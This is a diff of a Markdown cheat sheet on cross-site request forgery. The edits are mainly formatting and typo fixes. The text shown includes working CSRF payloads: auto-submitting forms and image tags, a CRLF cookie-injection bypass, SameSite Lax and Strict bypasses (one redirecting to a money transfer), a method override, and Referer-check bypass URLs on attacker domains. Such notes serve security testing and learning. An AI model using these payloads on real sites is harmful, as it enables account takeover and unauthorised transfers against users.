@@ -19,11 +19,11 @@
   * Example: change password
 * Cookie-based session handling
 * No unpredictable request parameters:
-  * If you need to know the value of the existing password -> no vulnerable
+  * If you need to know the value of the existing password -> not vulnerable
 
 ## **Exploit**
 
-1. with POST
+1. With POST
 
 ```html
 <html>
@@ -38,7 +38,7 @@
 </html>
 ```
 
-2. with GET
+2. With GET
 
 ```html
 <img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">
@@ -97,10 +97,16 @@ Some applications make use of the HTTP Referer header to attempt to defend again
 
 * **Switch from POST to the GET method to bypass**
 * **Remove the entire parameter containing the token**
-* Sometimes you don't need a valid token (the app doesn't keep valid server-side tokens) .
+* Sometimes you don't need a valid token (the app doesn't keep valid server-side tokens).
   * Simply **invent a token in the required format**
+
+***
+
 * Some apps don't validate if the token belongs to the same session as the requesting user.
   * Log in to the application with your account, **obtain a valid token**, and then **feed that token to the victim user** in their CSRF attack
+
+***
+
 * Some applications do tie the CSRF token to a cookie, but not to the session cookie. So there are two token: one in a cookie and one in hidden input. (this can also have the same value)
   * Can you set a cookie? Ex. Header injection with `CRLF`.&#x20;
   * ```
@@ -112,43 +118,55 @@ Some applications make use of the HTTP Referer header to attempt to defend again
     <img src="https://vulnerable-website.com/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">
     ```
 
-
-
 ## SameSite cookies bypass
 
 * Bypassing SameSite Lax restrictions using GET requests
-  * ```html
-    <script>
-        document.location = 'https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000';
-    </script>
-    ```
-  * Even if an ordinary `GET` request isn't allowed, some frameworks provide ways of overriding the method specified in the request line. Example some framework supports `_method` parameter. Other frameworks support a variety of similar parameters.
+
+```html
+<script>
+    document.location = 'https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000';
+</script>
+```
+
+***
+
+* Bypassing SameSite Lax restrictions using GET method override
+  * Even if an ordinary `GET` request isn't allowed, some frameworks supports `_method` parameter. (Other frameworks support a variety of similar parameters)
   * ```http
     GET /my-account/change-email?email=a@a.com&_method=POST HTTP/1.1
     ```
+
+***
+
 * Bypassing SameSite Strict bypass via client-side redirect
   * Consider a page `https://vulnerable-website.com/post/confirm?postId=10` that load this script.
-  * ```javascript
-    redirectOnConfirmation = () => {
-        setTimeout(() => {
-            const url = new URL(window.location);
-            const postId = url.searchParams.get("postId");
-            window.location = '/post/' + postId;
-        }, 3000);
-    }
-    ```
-  * ```html
-    <script>
-        document.location = "https://vulnerable-website.com/post/confirm?postId=10/../../my-account/change-email?email=a@a.com";
-    </script>
-    ```
-  * Note: this attack isn't possible with server-side redirects, as browsers recognize the cross-site request and apply cookie restrictions.
+
+```javascript
+redirectOnConfirmation = () => {
+    setTimeout(() => {
+        const url = new URL(window.location);
+        const postId = url.searchParams.get("postId");
+        window.location = '/post/' + postId;
+    }, 3000);
+}
+```
+
+```html
+<script>
+    document.location = "https://vulnerable-website.com/post/confirm?postId=10/../../my-account/change-email?email=a@a.com";
+</script>
+```
+
+Note: this attack isn't possible with server-side redirects, as browsers recognize the cross-site request and apply cookie restrictions.
 
 ## Referer-based validation bypass
 
 * Validation of Referer depends on header being present
   * Some apps validate the Referer header if present, but skip if omitted
   * `<meta name="referrer" content="never">`
+
+***
+
 * Validation of Referer can be circumvented
   * `http://vulnerable-website.com.attacker-website.com/csrf-attack`
   * `http://attacker-website.com/csrf-attack?vulnerable-website.com`
